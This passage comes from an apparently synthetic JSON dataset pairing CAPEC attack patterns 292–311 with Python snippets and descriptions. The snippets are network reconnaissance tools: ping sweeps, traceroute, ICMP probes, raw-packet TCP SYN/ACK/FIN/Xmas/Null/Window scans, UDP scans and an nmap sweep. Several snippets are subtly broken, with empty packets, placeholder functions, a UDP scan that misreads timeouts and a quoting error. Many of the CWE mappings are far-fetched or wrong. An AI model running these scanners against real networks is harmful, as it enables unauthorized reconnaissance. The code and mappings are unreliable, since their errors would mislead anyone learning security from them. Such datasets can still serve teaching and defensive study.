        "description": "This Python code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server that allows zone transfers. The code attempts to transfer the DNS zone data from a specified vulnerable DNS server for a given domain. If successful, it prints out the zone data, which can include sensitive information about the network topology, IP addresses, and hostnames. This represents the CAPEC 'DNS Zone Transfers' and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing internal network details. The code also indirectly touches on CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) by showing how DNS information can be misused if not properly secured."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import socket\n\n# Function to perform a ping sweep\ndef ping_sweep(ip_range):\n    for ip in ip_range:\n        try:\n            # Create a socket\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(1)\n            # Attempt to connect to the host\n            result = sock.connect_ex((ip, 80))\n            if result == 0:\n                print(f'Host {ip} is alive')\n            else:\n                print(f'Host {ip} is not responding')\n            sock.close()\n        except Exception as e:\n            print(f'Error pinging {ip}: {e}')\n\n# Example IP range\nip_range = ['192.168.1.1', '192.168.1.2', '192.168.1.3']\nping_sweep(ip_range)",
        "description": "This Python code snippet performs a basic 'ping sweep' to discover live hosts within a given IP range. It attempts to connect to each IP address on port 80 (HTTP) and prints whether the host is alive based on the response. This embodies the main idea of CAPEC-292 (Host Discovery) by probing IP addresses to determine if hosts are active. The code also touches on related CWEs: it could expose sensitive information (CWE-200) if the IP range is sensitive, and it uses cleartext transmission (CWE-319) since it connects over HTTP. Additionally, it could be exploited to replicate malicious code (CWE-509) if used in a broader attack context."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to perform traceroute\ndef traceroute(dest_name, max_hops=30):\n    dest_addr = socket.gethostbyname(dest_name)\n    port = 33434\n    ttl = 1\n    while ttl <= max_hops:\n        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        recv_socket.bind(('', port))\n        send_socket.sendto(b'', (dest_name, port))\n        curr_addr = None\n        curr_name = None\n        try:\n            _, curr_addr = recv_socket.recvfrom(512)\n            curr_addr = curr_addr[0]\n            try:\n                curr_name = socket.gethostbyaddr(curr_addr)[0]\n            except socket.error:\n                curr_name = curr_addr\n        except socket.error:\n            pass\n        finally:\n            send_socket.close()\n            recv_socket.close()\n        if curr_addr is not None:\n            curr_host = f\"{curr_name} ({curr_addr})\"\n        else:\n            curr_host = \"*\"\n        print(f\"{ttl}\t{curr_host}\")\n        ttl += 1\n        if curr_addr == dest_addr:\n            break\n\n# Example usage\ntraceroute('example.com')",
        "description": "This Python code snippet performs a traceroute to a specified destination, 'example.com' in this case. The traceroute function sends UDP packets with incrementing TTL values to map out the route data takes through the network. Each hop along the route returns an ICMP message when the TTL expires, allowing the code to identify intermediate routers and systems. This process can expose sensitive network topology information (CWE-200, CWE-497) and potentially transmit this information in cleartext (CWE-319). The code demonstrates how an adversary might use traceroute to gather network information, aligning with the CAPEC description of 'Traceroute Route Enumeration'."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import socket\n\n# Vulnerable function to handle ICMP Address Mask Request\n\ndef handle_icmp_request():\n    # Create a raw socket to listen for ICMP packets\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    sock.bind(('0.0.0.0', 0))  # CWE-1327: Binding to an unrestricted IP address\n\n    while True:\n        packet, addr = sock.recvfrom(1024)\n        if packet[20] == 17:  # ICMP Type 17 (Address Mask Request)\n            print(f'Received ICMP Address Mask Request from {addr[0]}')\n            # CWE-200: Exposure of sensitive information\n            # Respond with a fake Address Mask Reply (ICMP Type 18)\n            response = packet[:20] + b'\\x12' + packet[21:]\n            sock.sendto(response, addr)\n            print(f'Sent Address Mask Reply to {addr[0]}')\n\nhandle_icmp_request()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of handling ICMP Address Mask Requests. The function `handle_icmp_request` creates a raw socket to listen for ICMP packets and binds it to the unrestricted IP address '0.0.0.0' (CWE-1327). When an ICMP Type 17 (Address Mask Request) packet is received, it prints the source address and responds with a fake Address Mask Reply (ICMP Type 18). This exposes sensitive information (CWE-200) and can be exploited by an adversary to gather network configuration details, aiding in further attacks. The code embodies the main idea of the CAPEC by demonstrating how an ICMP Address Mask Request can be used to gather sensitive network information."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import requests\nimport time\n\n# Function to get the server timestamp\ndef get_server_timestamp(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.headers['Date']\n    return None\n\n# URL of the target server\nurl = 'http://example.com'\n\n# Get the server timestamp\nserver_time = get_server_timestamp(url)\nif server_time:\n    print(f'Server time: {server_time}')\nelse:\n    print('Failed to retrieve server time')\n\n# Simulate an attack using the timestamp\n# This is a placeholder for the actual attack logic\n# For example, using the timestamp to predict random numbers or bypass time-based authentication\nattack_success = False\nif server_time:\n    # Placeholder for attack logic\n    attack_success = True\n\nif attack_success:\n    print('Attack successful')\nelse:\n    print('Attack failed')",
        "description": "This Python code snippet demonstrates a basic example of a 'Timestamp Request' attack. The code sends a GET request to a target server to retrieve the server's timestamp from the response headers. This timestamp can then be used in various attacks, such as predicting random numbers or bypassing time-based authentication mechanisms. The code also includes placeholders for the actual attack logic, which would leverage the retrieved timestamp. This example highlights the potential vulnerabilities associated with exposing sensitive information (CWE-200) and the risks of using GET requests with sensitive data (CWE-598)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# ICMP Information Request message type (deprecated)\nicmp_info_request = b'\\x0F\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send ICMP Information Request\nsock.sendto(icmp_info_request, (target_ip, 0))\n\n# Receive response\nresponse, addr = sock.recvfrom(1024)\n\n# Print the response\nprint(f'Response from {addr}: {response}')",
        "description": "This Python code snippet demonstrates the sending of an ICMP Information Request to a target IP address. The ICMP Information Request is a deprecated message type, originally used for network configuration of diskless machines. The code creates a raw socket, constructs an ICMP Information Request message, and sends it to the specified target IP. It then waits for a response and prints it. This code embodies the main idea of the CAPEC by attempting to determine if the target host responds to this deprecated mechanism. The related CWEs are represented by the potential exposure of sensitive information (CWE-200, CWE-497) and the transmission of data in cleartext (CWE-319)."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n\ndef tcp_ack_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct a TCP packet with ACK flag set\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45'  # Version and Header Length\n        packet += b'\\x00'  # Type of Service\n        packet += b'\\x00\\x28'  # Total Length\n        packet += b'\\xab\\xcd'  # Identification\n        packet += b'\\x40\\x00'  # Flags and Fragment Offset\n        packet += b'\\x40'  # TTL\n        packet += b'\\x06'  # Protocol (TCP)\n        packet += b'\\x00\\x00'  # Header Checksum\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (spoofed)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x10'  # Data Offset and Flags (ACK)\n        packet += b'\\x71\\x10'  # Window Size\n        packet += b'\\x00\\x00'  # Checksum\n        packet += b'\\x00\\x00'  # Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}: {response}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    tcp_ack_ping('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP ACK Ping, which is used to determine if a remote host is alive by sending a TCP segment with the ACK flag set. The code constructs a raw TCP packet with the ACK flag and sends it to the target IP and port. If the host is alive, it will respond with a RST packet, which the code captures and prints. The code also highlights several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) as the packet is sent in cleartext, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as the response reveals the host's status, and CWE-605 (Multiple Binds to the Same Port) as the raw socket could interfere with other services on the same port."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.settimeout(2)\n\n# Target IP and random high port\ntarget_ip = '192.168.1.1'\ntarget_port = 65535\n\n# Send a UDP packet to the target\ntry:\n    sock.sendto(b'', (target_ip, target_port))\n    print(f'Sent UDP packet to {target_ip}:{target_port}')\n\n    # Wait for an ICMP 'port unreachable' response\n    try:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received response from {addr}')\n    except socket.timeout:\n        print('No response received')\nexcept Exception as e:\n    print(f'Error: {e}')\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a UDP ping to determine if a remote host is alive. It sends a UDP packet to a high, typically unused port on the target IP address. If the target host is alive and the port is closed, it will respond with an ICMP 'port unreachable' message. The code uses a socket to send the UDP packet and waits for a response. This approach can exploit weaknesses in firewall configurations that do not block UDP packets to high ports or certain ICMP messages. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing the host's status, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by sending packets to a high, random port."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\n\n# Function to perform TCP SYN Ping\ndef tcp_syn_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP SYN packet\n        packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # IP header\n        packet += b'\\x0a\\x00\\x00\\x01'  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header\n        packet += b'\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # SYN flag\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)\n        print(f'Received response from {target_ip}: {response}')\n\n    except socket.error as e:\n        print(f'Socket error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_syn_ping(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP SYN Ping, which is used for host discovery by sending a TCP SYN packet to a target IP and port. The code creates a raw socket and constructs a TCP SYN packet, then sends it to the target. If the target port is open, it will respond with a SYN/ACK packet; if closed, it will respond with a RST packet. This behavior is used to determine if the host is alive. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and improper enforcement of message integrity (CWE-924)."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\n\n# Vulnerable code that exposes sensitive information and allows port scanning\n\ndef check_open_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        try:\n            s.connect((ip, port))\n            open_ports.append(port)\n        except:\n            pass\n        s.close()\n    return open_ports\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_check = [22, 80, 443, 8080]\nopen_ports = check_open_ports(ip_address, ports_to_check)\nprint(f\"Open ports on {ip_address}: {open_ports}\")\n\n# Exposing sensitive information\nif open_ports:\n    print(f\"Sensitive information: Open ports on {ip_address} are {open_ports}\")\n\n# Cleartext transmission of sensitive information\nsensitive_data = f\"Open ports on {ip_address}: {open_ports}\"\nprint(f\"Transmitting sensitive data: {sensitive_data}\")",
        "description": "This Python code snippet demonstrates a basic port scanning functionality, which is the main idea of the CAPEC. The function `check_open_ports` attempts to connect to a list of specified ports on a given IP address and returns a list of open ports. The code also includes vulnerabilities related to the CWEs mentioned: it exposes sensitive information about open ports (CWE-200), and it transmits this information in cleartext (CWE-319). The code is designed to be concise and illustrate how an adversary might use port scanning to gather information about open ports on a target system."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-617: Reachable Assertion\n# CWE-353: Missing Support for Integrity Check\n\ndef tcp_connect_scan(target_ip, target_port):\n    try:\n        # Create a socket object\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        \n        # Attempt to connect to the target IP and port\n        result = sock.connect_ex((target_ip, target_port))\n        \n        if result == 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n        \n        sock.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n        \n# Example usage\nif __name__ == \"__main__\":\n    target_ip = \"192.168.1.1\"\n    target_port = 80\n    tcp_connect_scan(target_ip, target_port)\n",
        "description": "This Python code snippet demonstrates a basic TCP connect scan, which attempts to establish a full TCP connection to a specified IP address and port. The code uses the socket library to create a TCP connection and checks if the port is open or closed based on the success of the connection attempt. This embodies the main idea of the CAPEC 'TCP Connect Scan'. The code also touches on several related CWEs: it relies on the IP address for determining the target (CWE-291), potentially exposes sensitive information about open ports (CWE-200), and does not include integrity checks for the data transmitted (CWE-353). Additionally, it does not handle multiple binds to the same port (CWE-605) and could be vulnerable to reachable assertions (CWE-617) if extended with more complex logic."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\n\ndef tcp_fin_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP packet with FIN flag set\n        packet = b''\n        # IP header fields\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol | Header Checksum\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        # TCP header fields\n        packet += b'\\x00\\x50'  # Source Port (example)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x01\\x00\\x00'  # Data Offset, Reserved, Flags (FIN) | Window\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum | Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response[33] == 0x14:  # Check if RST flag is set in the response\n            print(f'Port {target_port} is closed.')\n        else:\n            print(f'Port {target_port} is open or filtered.')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\ntcp_fin_scan('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP FIN scan, which is used to determine if a port on a target machine is closed. The code creates a raw socket and constructs a TCP packet with the FIN flag set. It sends this packet to the target IP and port, and then listens for a response. If a RST (reset) packet is received, it indicates that the port is closed. This behavior is based on the RFC 793 specification. The code also touches on related CWEs by showing how sensitive information (port status) can be exposed to unauthorized actors (CWE-200), and how the lack of integrity checks (CWE-353) and improper restriction of communication channels (CWE-923) can be exploited in such scans."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP Xmas Scan\ndef tcp_xmas_scan(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Construct the TCP packet with all flags set (Xmas Tree Packet)\n    packet = b''\n    # IP Header (20 bytes)\n    packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n    packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n    packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n    packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n    packet += socket.inet_aton(target_ip)  # Destination IP\n    # TCP Header (20 bytes)\n    packet += b'\\x00\\x50'  # Source Port (example)\n    packet += target_port.to_bytes(2, 'big')  # Destination Port\n    packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n    packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n    packet += b'\\x50\\xff\\xff\\xff'  # Data Offset, Reserved, Flags (all set)\n    packet += b'\\x00\\x00\\x00\\x00'  # Window Size | Checksum | Urgent Pointer\n\n    # Send the packet\n    sock.sendto(packet, (target_ip, 0))\n\n    # Receive response\n    try:\n        response = sock.recv(1024)\n        if response[33] == 0x14:  # Check if RST flag is set in the response\n            print(f'Port {target_port} is closed.')\n        else:\n            print(f'Port {target_port} is open or filtered.')\n    except socket.timeout:\n        print(f'No response from port {target_port}.')\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.2'  # Target IP (example)\n    target_port = 80  # Target Port (example)\n    tcp_xmas_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP Xmas scan, which is used to determine if ports on a target machine are closed. The scan sends TCP segments with all possible flags set in the packet header, creating illegal packets according to RFC 793. If the target port is closed, the target machine responds with a RST packet. The code constructs a raw TCP packet with all flags set, sends it to the target IP and port, and checks the response for a RST flag to determine if the port is closed. This scan can expose sensitive information about the target's network configuration, which is related to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code also highlights the importance of proper communication channel restrictions and message integrity, as outlined in the related CWEs."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP NULL scan\ndef tcp_null_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP packet with no flags set (NULL scan)\n        packet = b''\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Port {target_port} is closed (RST received)')\n        else:\n            print(f'Port {target_port} is open (no response)')\n    except socket.error as e:\n        print(f'Socket error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_null_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP NULL scan, which is used to determine if ports on a target machine are closed. The code creates a raw socket and sends a TCP packet with no flags set to the specified target IP and port. If a response is received, it indicates that the port is closed (RST received). If no response is received, it indicates that the port is open. This scan type exploits the behavior described in RFC 793, where out-of-state TCP segments sent to closed ports should generate a RST response. The code also includes basic error handling for socket operations. The related CWEs provide context for potential vulnerabilities, such as exposure of sensitive information and unchecked return values, which are not directly addressed in this simple scan example but are relevant in broader network security contexts."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\n\n# Vulnerable code: Cleartext transmission of sensitive information\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to a specific port\n# CWE-605: Multiple Binds to the Same Port\nsock.bind(('0.0.0.0', 80))\n\n# Function to send a TCP ACK packet\n# CAPEC: TCP ACK Scan\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n\ndef send_ack_packet(target_ip, target_port):\n    # Construct a TCP ACK packet (simplified)\n    packet = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # IP header\n    packet += b'\\x7f\\x00\\x00\\x01'  # Source IP (127.0.0.1)\n    packet += socket.inet_aton(target_ip)  # Destination IP\n    packet += b'\\x00\\x50'  # Source port (80)\n    packet += target_port.to_bytes(2, 'big')  # Destination port\n    packet += b'\\x00\\x00\\x00\\x00'  # Sequence number\n    packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment number\n    packet += b'\\x50\\x10\\x00\\x00'  # Flags (ACK)\n    packet += b'\\x00\\x00\\x00\\x00'  # Window, Checksum, Urgent pointer\n\n    # Send the packet\n    sock.sendto(packet, (target_ip, target_port))\n\n# Example usage\nsend_ack_packet('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a simplified version of a TCP ACK scan, which is used to gather information about firewall or ACL configurations. The code creates a raw socket and binds it to port 80, which can lead to CWE-605 (Multiple Binds to the Same Port). The function `send_ack_packet` constructs and sends a TCP ACK packet to a target IP and port, potentially exposing sensitive information (CWE-200) and transmitting it in cleartext (CWE-319). The code also highlights issues related to access control checks (CWE-1280) and exposure of access control list files (CWE-529). This example is for educational purposes and demonstrates how such vulnerabilities can be present in network scanning tools."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\n\ndef tcp_window_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Send a TCP packet with ACK flag set\n        packet = create_ack_packet(target_ip, target_port)\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)[0]\n        window_size = parse_window_size(response)\n\n        if window_size > 0:\n            print(f'Port {target_port} is open on {target_ip}.')\n        else:\n            print(f'Port {target_port} is closed on {target_ip}.')\n    except Exception as e:\n        print(f'Error: {e}')\n\n\ndef create_ack_packet(target_ip, target_port):\n    # This function should create a TCP packet with the ACK flag set\n    # For simplicity, this is a placeholder\n    return b''\n\n\ndef parse_window_size(response):\n    # This function should parse the TCP window size from the response\n    # For simplicity, this is a placeholder\n    return 0\n\n# Example usage\nif __name__ == '__main__':\n    tcp_window_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic implementation of a TCP Window Scan, which is used to infer the status of a port and potentially the operating system type based on the TCP window size field in RST packets. The code creates a raw socket, sends a TCP packet with the ACK flag set to the target IP and port, and then parses the response to determine the window size. If the window size is positive, it infers that the port is open; otherwise, it infers that the port is closed. This scan can expose sensitive information (CWE-200, CWE-497) and is vulnerable to interception (CWE-319) and integrity issues (CWE-353). The code is simplified and placeholders are used for packet creation and parsing functions."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import socket\nimport struct\n\n# Vulnerable RPC service scanner\n\ndef scan_rpc_services(host):\n    # Create a raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Construct a TCP packet\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton('0.0.0.0'), socket.inet_aton(host))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             12345, 111, 0, 0, 80, 2, 8192, 0, 0)\n\n    packet = ip_header + tcp_header\n\n    # Send the packet\n    s.sendto(packet, (host, 0))\n\n    # Receive the response\n    response = s.recv(1024)\n    print(response)\n\n# Example usage\nscan_rpc_services('192.168.1.1')",
        "description": "This Python code snippet demonstrates a basic TCP RPC scan on a Unix/Linux host. It creates a raw socket to send a crafted TCP packet to a specified host, attempting to discover RPC services. The code is vulnerable to several weaknesses: it exposes sensitive information (CWE-200) by printing the response, it could be exploited for authentication bypass (CWE-294) if the response contains replayable data, it does not verify the integrity of the response (CWE-494), it could be used for SSRF (CWE-918) by sending requests to unintended destinations, and it may allow multiple binds to the same port (CWE-605) if not properly managed. This snippet embodies the main idea of CAPEC-292 by scanning for RPC services on a target host."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\n\n# Function to perform UDP scan\ndef udp_scan(target_ip, target_port):\n    try:\n        # Create a UDP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(1)\n\n        # Send an empty UDP packet\n        sock.sendto(b'', (target_ip, target_port))\n\n        try:\n            # Try to receive a response\n            data, _ = sock.recvfrom(1024)\n            print(f'Port {target_port} is open or filtered')\n        except socket.timeout:\n            print(f'Port {target_port} is open (no response)')\n        except Exception as e:\n            print(f'Error: {e}')\n    except Exception as e:\n        print(f'Failed to create socket: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nudp_scan('192.168.1.1', 53)",
        "description": "This Python code snippet demonstrates a basic UDP scan to determine the status of a UDP port on a target system. The function `udp_scan` creates a UDP socket and sends an empty UDP packet to the specified target IP and port. It then waits for a response to determine if the port is open or filtered. If no response is received within the timeout period, it assumes the port is open. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the status of UDP ports. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information) is implied as the scan could reveal open ports, CWE-605 (Multiple Binds to the Same Port) is not directly represented but could be a concern in a broader context, CWE-319 (Cleartext Transmission) is inherent in the UDP protocol, CWE-353 (Missing Support for Integrity Check) is relevant as UDP lacks built-in integrity checks, and CWE-385 (Covert Timing Channel) could be exploited by analyzing response times."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import os\nimport subprocess\n\ndef network_topology_mapping():\n    # Using a simple ICMP ping scan to map network nodes\n    ip_range = '192.168.1.0/24'\n    try:\n        # This command can expose sensitive information about the network\n        result = subprocess.check_output(['nmap', '-sn', ip_range], stderr=subprocess.STDOUT)\n        print(result.decode('utf-8'))\n    except subprocess.CalledProcessError as e:\n        print(f'Error during network scan: {e.output.decode('utf-8')}')\n\nif __name__ == '__main__':\n    network_topology_mapping()",
        "description": "This Python code snippet demonstrates a basic network topology mapping using the 'nmap' tool to perform an ICMP ping scan over a specified IP range. The code captures the output of the scan and prints it, which can expose sensitive information about the network nodes, hosts, and devices. This embodies the main idea of CAPEC-309 (Network Topology Mapping) by showing how an adversary might perform network reconnaissance. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), by potentially exposing sensitive network information to unauthorized users."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\n\n# Function to scan for open ports\ndef scan_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Function to check for vulnerable services\ndef check_vulnerable_services(ip, open_ports):\n    vulnerable_services = {}\n    for port in open_ports:\n        if port == 21:  # FTP\n            vulnerable_services[port] = 'FTP'\n        elif port == 23:  # Telnet\n            vulnerable_services[port] = 'Telnet'\n        elif port == 25:  # SMTP\n            vulnerable_services[port] = 'SMTP'\n        elif port == 161:  # SNMP\n            vulnerable_services[port] = 'SNMP'\n    return vulnerable_services\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_scan = [21, 23, 25, 80, 161]\nopen_ports = scan_ports(ip_address, ports_to_scan)\nvulnerable_services = check_vulnerable_services(ip_address, open_ports)\n\nprint(f\"Open Ports: {open_ports}\")\nprint(f\"Vulnerable Services: {vulnerable_services}\")",
        "description": "This Python code snippet demonstrates a basic port scanning and service identification process, which aligns with the CAPEC description of 'Scanning for Vulnerable Software'. The `scan_ports` function scans a given IP address for open ports from a specified list. The `check_vulnerable_services` function then checks these open ports against a list of known vulnerable services (FTP, Telnet, SMTP, SNMP). The code highlights the potential exposure of sensitive system information (CWE-497) and the risk of excessive attack surface (CWE-1125) by identifying services that could be exploited if not properly secured. The example usage scans a hypothetical IP address and prints out the open ports and any identified vulnerable services."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
